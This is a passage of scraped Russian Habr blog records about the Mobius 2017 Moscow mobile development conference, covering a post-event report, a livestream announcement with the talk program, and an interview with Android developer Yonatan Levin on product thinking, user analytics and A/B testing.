интересуется «большими данными» и ищет возможность доказать, что движется в одном ритме с передовыми технологиями их процессинга.\n\nГовори и властвуй: философия массмедиа\n\n10.12.2017\nЛекторий Синхронизации, Курсовой переулок 17/1\n900 р.\nБлагодаря коммуникации мы ежедневно заново “создаваем” цивилизацию, и от того, как мы общаемся друг с другом, зависят наше восприятие реальности, тип общества и политические устои. Многие из форм массмедиа возникли еще в древности, но со временем изменили свои функции. Так, мифы, возникшие как средство избавления первобытного человека от страхов, сегодня используются для манипуляции общественным сознанием.", {"day": "3", "month": "декабря", "time": "23:16"}, {"rate": 5, "views": 1500}], ["Где в Москве можно за один день увидеть сразу нескольких людей, использующих iPhone X, когда с его старта продаж прошла какая-то неделя? На конференции о мобильной разработке.\n\r\nВ Петербурге Mobius проходит уже далеко не первый год, а вот в Москве мы провели эту конференцию впервые. Как всё выглядело по сравнению с предыдущим петербургским событием? Как на программе сказалось то, что успело произойти в прошедшие с тех пор полгода? И зачем на сцене понадобилась палитра художника? Все подробности — под катом.\n\n\n\r\nНа петербургском Mobius в последний раз целая треть аудитории оказалась из Москвы. Тогда-то и стало очевидно, что в столице тоже необходима такая конференция. Любопытно теперь сравнить с тем, каким оказалось распределение зрителей в самой столице: 54% — москвичи, 11% из Петербурга, 29% из других российских городов, 6% из-за рубежа.\n\r\nКак можно помнить, на прошлом Mobius очень часто звучало слово «архитектура». А в этом случае оно зазвучало ещё до начала докладов. На стенде Avito с самого утра начали конкурс «Мамин архитектор», предложив участникам собирать «архитектуру из наклеек» и голосовать за понравившиеся чужие варианты. Увидеть в числе претендентов можно было, например, такое:\n\n\n\r\nКстати, Telegram-чат об Android-архитектуре, появившийся из-за доклада на предыдущем Mobius, тем временем живее всех живых. Как мы писали полгода назад, «За несколько месяцев чат разросся до 700 участников, чего никто не ожидал». А теперь их уже более 1400!\n\r\nЕщё одним очень популярным словом на предыдущем Mobius стало «Kotlin», а через два месяца после этого Google заявил о поддержке языка в Android-разработке. С одной стороны, нам это льстит: получается, что наша конференция предвосхитила большие новости. С другой, тут крылась и сложность: обретя популярность, язык обзавёлся собственной американской конференцией KotlinConf, поэтому во время московского Mobius многие значимые Kotlin-спикеры ещё отходили от другого мероприятия и не были готовы ни в чём участвовать. \n\n\n\r\nНо в итоге Mobius и не остался без Kotlin, и не звал освещать эту тему кого попало. Сергей Рябов пишет на этом языке уже три года, начав задолго до объявления от Google — и его доклад «Пишем Java-френдли Kotlin-код» оказался одним из наиболее высоко оцененных зрителями. «Почему библиотеки просто не писать на Kotlin? Они все тогда будут просто из коробки работать с Java, и не нужно будет поддерживать все эти обёртки. Но всё не так радужно, как в рекламных проспектах, всегда есть приписочка мелким шрифтом, есть острые грани на стыке Kotlin и Java, и сегодня мы о них поговорим...» — начал он, и полез вглубь package kotlin.jvm. К языку обращалась в своём докладе и Лиза Рэй, рассказывавшая про data binding.\n\r\nА вот ещё один случай, когда что-то стало актуальным недавно, а у спикера Mobius уже есть большой опыт работы с этим. В то время как для широких кругов разработчиков Instant Apps долго были недоступны, компания Surf благодаря участию в Google Developers Agency Program получила доступ раньше других, и сделанное ей приложение магазина «Лабиринт» стало одним из 50, иконки которых гордо демонстрировали в кейноуте Google I/O 2017. Так что доклад Евгения Сатурова из Surf был не пересказом официальных материалов, а личным (и на данный момент редким) опытом. \n\n\n\r\nИ можно было услышать то, что в официальных материалах прямо не говорят: Google беспокоится, что технологией Instant Apps могут злоупотреблять для демонстрации заглушки «скачайте полное приложение». Поэтому на ревью там очень тщательно следят, чтобы каждое «мгновенное приложение» содержало в себе хотя бы один полный сценарий (то есть пользователь мог, не покидая пределов загружаемого 4-мегабайтного модуля, получить то, за чем пришёл).\n\r\nПо словам Евгения, при уже имеющемся «обычном» приложении создание Instant App — это на 90% рефакторинг, а не кодинг. Если у вас ранее не было разделения проекта на модули, то вот здесь оно потребуется, а дальше при одном проекте будут две разных сборки — «обычного» приложения и instant app.\n\r\nОтчасти перекликающаяся с Instant Apps тема — универсальные ссылки: они тоже по-своему размывают грань между приложениями и вебом. С темой «Универсальные ссылки: дворец из подводных камней» выступал Константин Якушев (Badoo), и по его приветствую было видно, что название конкурса от Avito ушло «в народ»: «Я не iOS-разработчик, хотя и выступаю в iOS-треке. Я отлаживал универсальные ссылки в Badoo, координировал всех ребят, потому что я мамин архитектор».\n\n\n\r\nПочему «дворец из подводных камней», в чём там сложности? Ну, понятно, там немало вариантов (при клике на десктопе должна открываться страница сайта, при клике на смартфоне с установленным приложением — нужная страница приложения, на смартфоне без него — магазин приложений или мобильный сайт), но где может возникнуть серьёзная техническая загвоздка? Как выяснилось, много где. \n\r\nОдин из озвученных примеров: сервис AppsFlyer, с помощью которого изначально пытались это реализовать, создавал ссылки только на своём домене. Понятно, что для компании масштаба Badoo это проблема («а вдруг он завтра поменяет правила или вообще закроется, мы не хотим привязываться к чужим адресам»). Вроде бы логичное решение — сделать свои ссылки и редиректить с них на AppsFlyer, тогда в случае чего можно просто отключить редирект. Но не тут-то было: оказывается, если пользователь не нажал сам на универсальную ссылку, а был на неё перенаправлен, то ссылка не открывает приложение.\n\r\nНа конференции нашлось место и настоящему хардкору. В iOS-секции Андрей Володин (Prisma AI) рассказывал об использовании GPU для вычислений — и подходил к этому очень тщательно, начав разговор о графике аж с Atari 2600 (1977), где было всего 128 байт оперативной памяти, так что графические элементы обрабатывались прямо по мере их поочерёдного вывода на экран. Перейдя от далёкого прошлого к вертексным шейдерам настоящего, он затем повёл разговор конкретно о специфике эппловского Metal: «Пройдёмся по API. В самом сердце класс MTLDevice, представляющий один GPU. Не относитесь к этому классу как к синглтону, хотя он и получается через глобальную функцию, потому что на iOS одна видеокарта, но на Mac тоже есть Metal, и вот там может быть больше одной».\n\n\n\r\nЛюбопытно, что как раз к этому Mobius стало яснее, зачем в Apple изначально создали собственный Metal, а не просто использовали OpenGL: этой осенью в iPhone впервые был использован GPU, разработанный непосредственно в Apple.\n\r\nКонтрастом к этому хардкору стали два зрелищных выступления Йонатана Левина (KolGene). В первом, «A friend in need — a JS indeed», он на примере конкретной ситуации из его предыдущей работы в Gett (когда одну и ту же логику требовалось реализовать и на сервере, и в двух приложениях, и в вебе) говорил о логичном объединении такого кода с помощью JS. И хотя доклад был по делу, одновременно с этим присутствовало и шоу. За правильный подсчёт числа упоминаний Gett в докладе Йонатан пообещал футболку, а на моменте «GetTaxi переименовался в Gett, когда с его помощью стало возможно доставлять вещи, представьте себе Gett Beer» он прямо на сцене получил от трек-оунера пиво.\n\n\n\r\nНо совсем масштабное шоу он развернул в заключительном кейноуте. В конце дня было бы сложно усваивать что-то хардкорное — зато, наоборот, здорово отвлечься от потока технической информации и посмотреть на что-то яркое. Поэтому рассказ о том, как обычный разработчик может запилить фичу своей мечты даже при скепсисе менеджера, превратился в костюмированное представление. Вызвав на сцену добровольцев, Йонатан раздал им роли (самого Йонатана сыграл Денис Неклюдов, известный многим в зале). Затем им выдали соответствующие атрибуты (например, «дизайнер» выглядел как художник) — и последовавшие сценки вызвали у многих зрителей восторг. Особенно колоритен был Звиад Кардава (также известный многим по «Android Dev Подкасту»), получивший плётку и активно ей пользовавшийся.\n\n\n\r\nВсе доклады не перескажешь, и пора подводить итог — что можно сказать о первом московском Mobius по сравнению с петербургским? С одной стороны, ощущалась преемственность. Примерно те же люди в программном комитете, тот же Йонатан на закрывающем кейноуте, а Android Dev Подкаст снова записал на конференции спецвыпуск — в общем, знакомый формат.\n\r\nА с другой, хватало и нового. Разумеется, новыми были непосредственно доклады (тот же Йонатан, хоть и срывал аплодисменты не в первый раз, делал это уже с другим материалом), и в части случаев они содержали информацию, которой полгода назад ещё попросту не было. Были новые лица на сцене — например, та же Лиза Рэй приехала впервые и многим полюбилась. И, несмотря на то, что на петербургскую конференцию ранее приезжало много москвичей, тут было много новых лиц в зале: когда на открытии спрашивали, кто на Mobius впервые, поднятых рук оказалось впечатляющее количество.\n\r\nТеперь осталось дождаться следующего петербургского Mobius и посмотреть, чем ответит Москве культурная столица.", {"day": "17", "month": "ноября", "time": "18:27"}, {"rate": 24, "views": 5300}], ["Привет, Хабр! Уже есть планы на субботу? Может, съездить на дачу или заняться ремонтом? Есть кое-что получше.\nДело в том, что до Mobius 2017 Moscow осталась всего пара дней, и пришло время объявить об открытии бесплатной трансляции главного трека! Под катом — небольшой changelog, ссылка на YouTube, официальный Telegram-канал и краткий обзор программы первого трека.\n\n\r\nМобильный рынок развивается настолько стремительно, что для того, чтобы понравиться пользователям, уже недостаточно разработать просто хорошее приложение или организовать хорошую конференцию. Нужно ориентироваться на аудиторию, гибко и быстро реагировать на её потребности. Одна из основных потребностей хабросообщества — возможность увидеть конференцию удалённо и в хорошем качестве.\n\r\nНасчет качества. С апрельского Mobius прошло полгода, и мы основательно поработали над ошибками. Были проанализированы вообще все отзывы всех участников конференции, смотревших трансляцию. Исправлено, конечно, не всё, но многое. Начнем с того, что половина опрошенных (42%) даже не заметила никаких проблем — но мы-то знаем! Микрофоны будут работать лучше, звук будет чище, стабильность выше (благодаря стараниям наших друзей из SBTG.ru, которые ради этого даже переехали в более отказоустойчивый датацентр).\n\r\nВ перерывах между докладами, когда спикеры и участники на площадке удаляются в дискуссионные зоны, зрителям онлайн-трансляции мы показываем репортажи о внесессионных событиях конференции и берём увлекательные интервью у докладчиков и интересных гостей. Интервью будут живее: в промежутках между докладами будет два ведущих (@phillennium и @olegchir, наши посты вы можете регулярно видеть на Хабре). Мелкие технические неувязки поставлены на более жесткий контроль.\n\r\nВопросы участников (тех, кто смотрит бесплатно — тоже) теперь учитываются, задавать их можно в официальной Telegram-группе конференции. Разобраться с Telegram рекомендуется заранее. Вот прямо сейчас пойдите и установите его!\n\r\nСобственно, уже совсем скоро вы сможете увидеть, что у нас получилось — 11 ноября в 9:40 утра мы начнем бесплатную трансляцию главного трека Mobius 2017 Moscow. А еще она будет в разрешении 1440р, так что в кои-то веки вам понадобятся ваши крутые мониторы. Важно, что разрешение поднято не просто ради гонки за качеством видео, а со вполне конкретной целью: дополнительное пространство используется для отображения самого спикера рядом с экраном (который отображается в 1080p) — камера больше не будет скакать между слайдами и докладчиком.\n\nКак подключиться\r\nПросто открыть YouTube в браузере, мобильном устройстве или как вам удобней. Ссылка:\n\n\n\nОграничения\n\nТрансляция предоставляется по принципу as is: мы уверены, что все будет хорошо, но если вдруг что – не обессудьте!\nВидеозаписей не будет. То есть они, конечно, будут, но только для участников конференции, оставивших фидбэк. А для всех остальных мы традиционно выложим их через 3-4 месяца.\nВы не сможете смотреть, что происходит в других залах. А там будет много интересного. В следующий раз регистрируйтесь и смотрите все без ограничений.\n\nПрограмма\nВладимир @dzigoro Иванов — Пустота наследия: стратегия кардинальных улучшений в проекте\r\nВладимир — один из достаточно частых гостей наших конференций, и его должность ведущего разработчика в EPAM этому не причина. Всё дело в использовании круга интересов (Android, React, iOS, Web) и не менее занимательного бэкграунда спикера (начинал как Java EE-инженер, но увлекся мобильным технологиями «и покатился»). \r\nДля начала разомнём мат. аппарат (от слова «мат», а не «математика»). Разберём «Legacy». Каждому разработчику приходится сталкиваться с ним постоянно. Более того, каждый новый проект становится legacy со временем, если не уделять достаточно внимания техническому долгу. В докладе поговорим, как жить с особо запущенным случаем, aka проектом возраста более 5 лет.\n\r\nМы узнаем:\n\n\nкак осознать размер долга;\nкак придумать план рефакторинга;\nпровести его максимально безболезненно.\n\r\nКод будет на Java, но специфики Android почти нет, поэтому интересно будет инженерам обеих платформ.\r\nНемного теории, много практики, щепотка статистики, нескучные картинки — всё, как вы любите.\n\nМаксим @max_sokolov Соколов — Мессенджер наизнанку, или Как сегодня сделать мессенджер в мобильном iOS-приложении\r\nПредставьте, что вместо того, чтобы оторвать бумажку с телефоном от объявления на подъезде, можно взять смартфон и сразу написать владельцу напрямую, уточнив статус, не мучаясь с проблемой «трубу не берёт, достали, продали» и т.д. \r\nДля получения подобного мессенджера Максиму Соколову, как Team Lead в Avito, пришлось пройти через все тяжкие, от простого HTTP-API до использования веб-сокетов, узнавая про плюсы, минусы и подводные камни различных подходов. Максим поделится, как его команда проектировала клиент-серверное API и как в этом помогал Swift. Вы узнаете о том, как гарантировать доставку сообщений клиентам, онлайн-статусы пользователей, статусы сообщений и других функциях современных мессенджеров и их реализации.\n\r\nМессенджеры развиваются стремительно и новый функционал требуется добавлять быстро. В рамках доклада будет рассказано, как заложить масштабируемую архитектуру, которая позволит легко добавлять новые фишки.\n\nЕвгений @ptiz Камышанов — Жизнь без подключения: от хаоса к консенсусу\r\nСлишком много исторических отсылок получается в ходе обзора. Но что поделать, история движется по спирали: «приложения на десктопе стремятся работать в облаке независимо от локальной памяти», «приложения на телефоне постепенно обретают всё больший оффлайн-функционал».\n\r\nХорошо это или не очень, можно будет обсудить с Евгением Камышановым из EPAM после его практической демонстрации данного явления в ходе доклада. \r\nПри всём этом, будучи Lead iOS developer в компании EPAM в Санкт-Петербурге, спикер не верит в серебряные пули и по мере сил борется с перфекционизмом. \n\nАлександр @zlx Зимин — Давайте проектировать UI правильно\r\nУже прошло несколько месяцев с того момента, как мы взяли интервью у Александра, которое можно почитать тут. Информация в статье позволит представить спикера в разы лучше, чем тысяча лишних знаков в обзоре, поэтому перейдём непосредственно к докладу. \n\r\nВ докладе Александр расскажет про подходы к разработке UI, которые позволяют новым разработчикам вносить изменения без переписывания кода и переиспользования написанных компонентов.\n\r\nТакже часть доклада будет посвящена Atomic Design. Многие популярные приложения используют нестандартные визуальные компоненты, и команда Badoo — не исключение. Чтобы это не создавало много головной боли дизайнерам и разработчикам, им пришлось выработать решение, которое и будет представлено в докладе.\n\nГлеб @Novixon Новик — Архитектура сервисного слоя с использованием составных операций\r\nНаверняка многим знаком подкаст про мобильную разработку Podlodka. Его ведёт Глеб Новик, автор фреймворка COOperation. \r\nДоклад Глеба будет построен вокруг распространенного способа построения сервисного слоя приложения — это использование механизмов GCD для создания асинхронного взаимодействия компонентов. Многие задумываются, но мало кто использует на практике всю мощь классов NSOperation и NSOperationQueue для данной задачи.\n\r\nС помощью тщательной декомпозиции и небольшой доработки указанных классов можно получить чрезвычайно гибкий и переносимый компонент, который станет верным другом при создании новых сервисов. Глеб расскажет о том, как можно использовать составные операции при построении сервисного слоя и как в этом может помочь разработанный им фреймворк COOperation.\n\nДмитрий @handamade Куркин — Оптимизация размера приложения\r\nИтак, с чем у вас ассоциируется звук «о-оу»? За всех, естественно, говорить не стоит, но для тех, кто начинал до пришествия iPhone — это звук одного мессенджера, который по знаменитости был сопоставим с теперешним Telegram. \n\r\nК чему это всё? Дмитрий 12 лет занимается разработкой мессенджеров под разные платформы. Последние 5 лет делает iOS-клиент для ICQ (звук «о-оу») в должности team lead. \r\nРассмотрим, из чего складывается размер приложения на iOS и как этот размер можно уменьшить. Приведем несколько экспериментов для пояснения, из чего в итоге складывается размер приложения в AppStore, и расскажем про инструменты, которые помогут найти лишние данные и определить наиболее объемные участки кода программы.\n\nЙонатан Левин — Как самому запилить новую фичу и при этом не быть убитым своим менеджером\r\nУ вас когда-нибудь была ситуация, когда вы работаете в компании над приложением, и внезапно вам в голову приходит идея новой крутой фичи? Вы понимаете, вот он — переломный момент, но когда вы обращаетесь за поддержкой и одобрением на разработку, вы сталкиваетесь с препятствием: «У нас нет ресурсов», или «На данный момент у нас другие приоритеты». \n\r\nСотрудники, которые не понаслышке знакомы с продуктом компании, больше всего подходят для придумывания и проектирования лучших фич для приложения, но иногда на пути встают политики и процедуры компании. Но где есть желание, там есть возможности! Мир завоёвывают повстанцы и мятежники — Империя должна пасть! Если вы знаете, что эта фича важна, но у вас нет разрешения продолжать, вам придётся осторожно балансировать между свободой творчества и уважением к приоритетам вашей компании. \n\r\nВ данном докладе Йонатан поделится, как он разработал фичу без разрешения и как при этом его не уволили/покалечили/убили.\n\r\nЙонатан — один из ведущих израильских мобильных разработчиков, часть элитной команды Google Developer Experts. Сыграл ключевую роль в успехе Gett, собравшем более 500 миллионов долларов, а также получил финансирование своего стартапа KolGene, набирающего популярность генетического market connector-а. Будучи верным приверженцем мобильного и продукт-менеджмента, Йонатан также с большим энтузиазмом занимается бэкендом. Как состоявшийся разработчик и предприниматель, он точно знает, как превратить умные идеи в прибыльный продукт.", {"day": "9", "month": "ноября", "time": "15:45"}, {"rate": 31, "views": 5400}], ["Мобильный рынок развивается настолько стремительно, что для того, чтобы понравиться пользователям, уже недостаточно разработать просто хорошее приложение. Нужно ориентироваться на аудиторию, предлагать интересные и полезные фичи, но при этом не переборщить. Как балансировать между написанием кода и творческими идеями, где сейчас самые интересные проекты и нужны ли пользовательские данные для создания классного приложения? Мы поговорили об этом с экспертом по разработке под Android Йонатаном Левином.\n\n\n\nЙонатан Левин имеет звание Google Android Experts. В свое время он сыграл ключевую роль в успехе Gett и получил финансирование генетического market connector-а KolGene. Йонатан — состоявшийся Android-разработчик, а также предприниматель, который отлично знает, как превратить хорошие идеи для приложения в прибыльный продукт.\n\n\nКод и инструменты\n — Обычно приложения разрабатываются по четко прописанному ТЗ. Что плохого в том, что разработчик сосредоточится лишь на коде?\n\nЙонатан Левин: Конечно, в этом нет ничего плохого. Но и ничего хорошего. Расписать все в ТЗ — задача крайне тяжелая и подчас практически невыполнимая.\r\nРазработчик, который просто пишет код, — просто напишет код. И он, наверное, будет работать так, как указано в ТЗ.\n\r\nРазработчик, который понимает, почему он пишет именно такой код, как и кем он будет использоваться, куда этот продукт будет расти и какова вообще цель всего того, что он делает, — напишет не код, а продукт. Ведь именно мы, разработчики, являемся источником знаний о том, что лучше всего делать на той или иной платформе и как правильно построить то или иное техническое решение, основываясь на нуждах пользователя. А для этого нужно задавать кучу вопросов, понимать, что, почему и как все это в результате сделает жизнь пользователей продукта лучше.\n\n — Как изначально правильно поставить задачу и какие иструменты и подходы использовать? \n\nЙонатан Левин: Не знаю, как правильно, но я расскажу, как стараюсь делать сам. \r\nЕще на стадии формирования функции/продукта все разработчики команды обсуждают эту функцию. Я подготавливаю описание и все базисные данные в формате: «кто пользователь, почему нужна такая функциональность, кто ей будет пользоваться, как мы будем измерять ее успешность». Дальше мы садимся и все вместе обсуждаем, как лучше прийти к тому или иному решению. \n\r\nКаждый из моих коллег-разработчиков — эксперт в своей области. Я не могу сказать за них, что можно сделать лучше на айфоне, в вебе или бэкенде. Конечно, я смогу написать код под каждую платформу и выбрать какую-то архитектуру, но мои коллеги — эксперты по каждой из этих платформ и гораздо лучше меня знают, что лучше всего подойдет для нее.\n\r\nВ качестве инструментов, думаю, самое лучшее — пара фломастеров, доска для обсуждений, вкусный обед за счет компании и целый день — для непосредственно планирования и обсуждения.\n\n — Многие разработчики решают типовые задачи в рамках конвейера (к примеру, в веб-студиях). Как можно разнообразить рядовые задачи и нужно ли это делать?\n\nЙонатан Левин: Кто-то когда-то сказал, что любая разработка под Android сводится к тому, чтобы вытащить данные с бэкенда, спарсить и показать их в списке. Любая задача может превратиться в нудную и скучную. С другой стороны, эту же задачу можно превратить в суперинтересную и захватывающую. \n\r\nЯ думаю так: если ты получил задачу, с которой уже знаком, делал 100500 раз и сделаешь за треть из отведенного времени — это твоя возможность. В разработке выходит множество разных библиотек, архитектурных решений, изменений — это прекрасная возможность опробовать что-то новое, посмотреть, как оно работает под капотом, и благодаря этому проапгрейдить свои скиллы.\n\nАнализ пользователей\n — Как научиться переходить от шлифовки и красоты кода к анализу пользователей? В какой момент приходит понимание: «Все, хватит. Пользователям нужно качественное приложение, они не интересуются моим кодом»?\n\nЙонатан Левин: В какой момент пришло понимание? — В Gett я каждый раз, когда был очень взволнован выходом того или иного новшества в технологиях, сразу бежал делать это, реализовывать и интегрировать в приложение. Это выливалось в бессонные ночи баг-фиксинга и юзеров, которые не могли спокойно пользоваться приложением. \n\r\nЯ думаю, вначале мы все были такими. Как-то VP RnD при моем очередном взволнованном рассказе о новой штуке, которую сделал Square, спросил меня: «Ну, хорошо, а какой нашему бизнесу от этого прок, как мы выиграем от этого?» Я не смог ответить. Позже я понял, насколько он был прав. Это был просто очередной рефакторинг того, что и так работало и не требовало дополнительных ресурсозатрат.\n\r\nБольше кода — больше багов. Любой рефакторинг — это риск для бизнеса. Достаточно пару крашей, чтобы юзер перестал пользоваться приложением. Его не будет волновать, что сейчас у вас там Rx, Clean Architecture или какой-то новый ORM.\n\r\nЕсли вы не можете четко описать, какая будет польза бизнесу от вашего рефакторинга — стоит задуматься, нужен ли он вообще. Может лучше потратить время на создание новой функции, которая принесет вашему приложению еще больше славы?\n\nКак создать уникальное приложение?\n — Хочется сделать какой-то полезный и интересный для пользователей продукт. На какие сферы советуете обратить внимание? Есть ли какая-то интересная ниша, по каким-то причинам не занятая разработчиками?\n\nЙонатан Левин: На сегодняшний день Machine Learning — это, наверное, самая горячая тема. Но не как продукт, а как технология. С ее помощью можно создавать продукты, которые раньше не были доступны, при этом не нужно быть доктором в прикладной математике или алгоритмике. \n\r\nУже существует очень большой набор инструментов для создания продуктов на основе Machine Learning — от TensorFlow до всяких OCRов. А поле деятельности, на котором это можно применять, поистине огромное: я бы посоветовал начать с проблемы, которая больше всего волнует самого разработчика. Ведь лучший продукт — это тот, которым пользуешься сам.\n\n — Допустим, у меня чудесное приложение в узкой нише. Как донести пользователям его уникальность? В сторах огромное число приложений вываливается каждый день. Как вообще выделиться из толпы? \n\nЙонатан Левин: У меня есть такой экзамен. Я называю его экзамен «вау». И он начинается с того, что если это не «вау», то я не соглашаюсь на это. \n\r\nЕсли человек пришел на интервью, и у меня не было чувства «вау», я его не беру к себе в команду. И «вау» — это не обязательно по технологической части. По большей части это о том, что за человек, что он из себя представляет. \n\r\nТо же самое и с продуктами — нужно стремиться делать «вау»: вау-дизайн, вау-User Experience, вау-код, вау-коммуникации.\n\r\nОбычно у любой идеи, о которой можно задуматься, скорее всего есть уже 10 человек, которые подумали об этом и уже начали что-то делать. Поэтому важна не сколько идея, сколько ее реализация. Надо стремиться к тому, чтобы все было «вау» —  для того, чтобы шансы стать лучшим были самими высокими.\n\n — Как впечатлить пользователя с первых секунд запуска приложения? Что не нужно делать? К примеру, когда лучше применять splash-экран, push-уведомления и другие средства?\n\nЙонатан Левин: Мое личное мнение: SplashScreen — это боль. В среднем есть около пяти секунд, чтобы составить первое впечатление о приложении и подцепить пользователя на крючок. Обычно SplashScreen — это лого компании на красивом фоне. Чаще всего разработчики используют его, чтобы подгрузить всякие настройки. В действительности это должно быть тем, за счет чего пользователи запомнят ваше приложение. Есть другие более интересные решения, используемые при подгрузке параметров в бэкграунде.\n\r\nЯ думаю, что отличный крючок — сразу показать вашему пользователю наживку: то есть то, что делает ваше приложение. \n\r\nИ это можно сделать либо через процесс OnBoarding, где в очень красивом и интерактивном виде рассказать историю того, что есть в вашем приложении, либо сразу показав главные действия. Например, если у вас приложение «супермаркет», — сразу показать возможность добавки самых вкусных продуктов (шоколад!) в корзину, и только когда он закончит выбирать, предложить зарегистрироваться.\n\n — Допустим, приложение собирает множество данных в фоне: геолокацию, медиаконтент, контакты и т.п. Как это правильно замаскировать? И надо ли это маскировать?\n\nЙонатан Левин: Прозрачность — это, наверное, самое лучшее, что вы можете дать пользователям. Когда я был маленьким, нам всегда говорили — все тайное становится явным. Рано или поздно кто-то сделает реверс-инжиниринг вашего приложения, и все выплывет. Урон компании будет огромным. \n\r\nГораздо лучше дать пользователю возможность решить — хочет он или не хочет отдавать вам свои данные, объяснив, что и как будет происходить с ними. По моему опыту, большинство готово отдать свои данные за те или иные возможности в приложении.\n\n — Нужно ли вообще собирать данные о пользователях и в каком объеме? Это не нарушает их приватность? Чем это помогло в реальности? Какими сервисами и расширениями рекомендуете пользоваться?\n\nЙонатан Левин: Без данных — как без глаз. Тяжело найти истинный путь в потемках.\r\nС точки зрения легальности самый прямой путь — повесить terms & conditions, с которыми пользователи соглашаются. Впоследствии это может избавить от многих проблем. Это не значит, что нужно бежать к юристу и платить ему кучу тугриков. Интернет — очень полезная штука, если немного поискать, вполне можно найти шаблон Terms & Conditions, который подойдет на первых этапах развития, пока в компании не появится юрист.\n\r\nНасчет приватности — я думаю, что она как факт давно уже не существует. Если кто-то думает, что может скрыть что-либо от того, кто действительно хочет заполучить эту информацию — он заблуждается. Поэтому я особо не переживаю, когда кто-то собирает информацию о том, как я пользуюсь тем или иным приложением. И большинство пользователей, как показывает много случаев, ставят галочку на Terms & Conditions, даже не читая.\n\r\nВ реальности такая информация — клад. Клад, который потом поможет разобраться, что и как работает и как пользуются функциями приложения.\n\r\nДля начала я бы посоветовал поставить FullStory для веба и TestFairy для мобильных приложений. Это позволит смотреть, что именно делает ваш пользователь на сайте или в приложении. Я уверяю вас, вы удивитесь многим вещам.\n\r\nКроме этого, Google Analytics/Firebase Analytics дает очень много бесплатных плюшек в виде событий, которые можно фиксировать и использовать для дальнейшей обработки. \n\r\nПо возможности нужно измерять все. Начиная с того, сколько раз кликали на кнопку, до того, какую фотографию просматривали больше всего. Не говоря уж о том, что фиксировать бизнес-метрики — это абсолютно необходимое дело.\n\n — Вот мы собираем данные, анализируем каждый шаг пользователя в приложении. Как этими данными правильно распоряжаться?\n\nЙонатан Левин: Каждый раз, когда мы разрабатываем ту или иную фукнцию в приложении, нам нужно определить, какие метрики будут измерять ее успех. \n\r\nСкажем, вот мы добавили функцию автозаполнения названия генетического теста при его заказе. Как узнать, успешно она работает или нет? Что будет считаться успехом для этой функции? Может быть, количество успешно подсказанных имен в тесте? Или, может быть, общее время, проведенное на экране заказа? Или то, с какой буквы мы попали?\n\r\nВсе это нужно указать заранее и измерять, а потом решать, что с этим делать. И если оно не работает — резать функционал как загнившую часть.\n\nКак понять, успешно ли приложение?\n — Как правильно установить KPI для своего проекта? Как проверить их выполнение аналитическими системами?\n\nЙонатан Левин: Методом проб и ошибок. Проще всего исходить из бизнес-модели. Т.е. если заработок идет от количества выполненных генетических тестов, нужно мерить все, что может повлиять на это. К примеру, KPI может быть от уровня и времени взаимодействия лаборатории и скорости выполнения ее работы до разброса цен в предложениях от разных лабораторий. \n\n— Расскажите про A/B тесты. Как и чем их корректно реализовать? Как не переборщить с A/B тестами?\n\nЙонатан Левин: Я полюбил Firebase Remote Config. Он позволяет прикручивать разные значения, основываясь на том, кто пользователь, откуда он и как он себя ведет. \n\r\nМожно сделать разные события в Firebase Analytics, и если одно из них произошло, то делать что-нибудь особенное для этого пользователя.\n\r\nНапример, можно установить кнопку заказа в верхнем меню, скажем, как Bottom Tab, и замерять, где больше всего пользователей конвертируются в тех, кто заказывает. Эти эксперименты можно запускать постоянно и продолжать сколько угодно времени.\n\r\nЧто замечательного в RemoteConfig — эти эксперименты и тесты можно проводить постоянно. От разных цветов, до навигации внутри приложения. Главное: заранее продумать их при разработки функциональности. В особенности если есть нюансы, о которых нет однозначного мнения. Самое лучшее — прикрутить это к RemoteConfig и смотреть, что работает надежнее. \n\r\nИ самое главное — когда вы поняли, что работает лучше всего, и знаете, что это не будет изменяться в ближайшее время — почистите код и удалите все эти подготовки под кофеварку внутри вашего приложения. Меньше кода — меньше багов.\n\nЕсли вы любите смаковать детали в мобильной разработке так же, как и мы, наверняка вам будут интересны вот эти доклады на нашей ноябрьской конференции Mobius 2017 Moscow:\n\n\nОптимизация размера приложения (Дмитрий Куркин, Mail.Ru)\n\nКак самому запилить новую фичу и при этом не быть убитым своим менеджером (Йонатан Левин, KolGene)\n\nCrash репорты Android NDK (Иван Пономарев, Akvelon)\n\nКак стать GPU-инженером за час (Андрей Володин, Prisma AI)", {"day": "9", "month": "ноября", "time": "13:00"}, {"rate": 22, "views": 12000}], ["На этот раз это действительно будет путешествие в прошлое и прыжок в новые технологии, притом одновременно, как, собственно, и в концепте самой игры с перемещением личности во времени. И да, — это отсыл к Assassin's Creed, а не историческому значению термина «прыжок веры».\n\r\nИ про игры тоже поговорим, но уже про взрослые. Как сделать приложение только для онлайна, без необходимости загрузки, и наоборот, приложение, которое не требует коннекта к сети. \n\r\nВозможно, мне даже пропустят не совсем стандартный формат обзорного поста и картинка со всеми спикерами конференции будет уже после ката. \n\r\nА ещё в этот раз у нас не будет открывающего кейноута, т.е. каждый доклад первого тайм-слота — это маленький кейноут, и времени на раскачку не будет. Сразу в прод! \n\r\nЧто ждать от докладов на конференции и куда с их помощью можно попасть — под катом. Совпадает ли наше видение с реальностью или нет, решать участникам Mobius 2017 Moscow.\n\nПрограмма\r\nИтак, для начала ознакомимся со списком докладчиков в общем. Возможно, кто-то вам понравится визуально, и вы сразу прокрутите на него. Но если всё-таки вы — сторонник подхода «узнать все варианты и потом выбрать», то, возможно, в хронологии у вас получится связная история. \n\n\n\r\nПо классической схеме существует несколько вариантов сред доставки личности  информации до пользователя, поэтому мы и поделили все доклады соответствующим образом. Начинаем. \n\nДоклады про Android\n\nLisa Wray — Data Binding in a Kotlin world\r\nМат для кого-то — это гимнастический настил, и кому-то не хватает уверенности при прыжке в UI. Что в жизни, что в разработке страхи есть, и, возможно, вы даже уже используете расширения Kotlin и RxJava в роли того самого мата и хотите делать всё чуть быстрее, проще и эффективнее. У нас есть для вас спикер. \n\r\nГостья с другой стороны Атлантики готова буквально на пальцах рассказать, как при помощи фреймворка Data Binding значительно уменьшить головную боль с кодом и изменить путь к созданию UI. Лиза не просто Android Google Developer Expert, она — выпускница бакалавриата MIT по музыке и ИТ. Прежде чем начать работать над приложением одного всемирно известного издания, она успела поработать в Google (неожиданно) в команде развития отношений разработчиков Android, Google Glass, Android Wear и т.д. \n\n\nJing Li — Android meets Docker\n\r\nJing Li — разработчик-агностик (что бы это сочетание ни значило) с упором на тулы, качество и CI. Возможно краткое интервью сможет сделать картинку более ясной. \r\nCI и так не самый легкий в реализации процесс, и в плане разработки ПО он до сих пор развивается в области мобайл. В докладе Джинга будет введение в Docker и качественно сделанный образ Docker для Android, на основе которого и построена презентация использования последнего 